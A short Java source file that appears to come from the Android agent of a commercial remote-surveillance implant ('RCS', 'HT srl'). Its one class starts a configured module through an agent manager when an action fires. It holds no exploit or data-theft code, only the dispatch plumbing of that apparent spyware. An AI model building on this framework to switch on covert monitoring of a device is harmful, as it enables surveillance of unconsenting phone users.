/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StartAgentAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import org.json.JSONObject;

import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAction;
import com.android.service.manager.ManagerAgent;
import com.android.service.util.Check;

/**
 * The Class StartAgentAction.
 */
public class StartModuleAction extends ModuleAction {
	private static final String TAG = "StartAgentAction"; //$NON-NLS-1$

	/**
	 * Instantiates a new start agent action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public StartModuleAction(final ConfAction params) {
		super( params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + moduleId) ;//$NON-NLS-1$
		}
		final ManagerAgent agentManager = ManagerAgent.self();

		agentManager.start(moduleId);
		return true;
	}

}
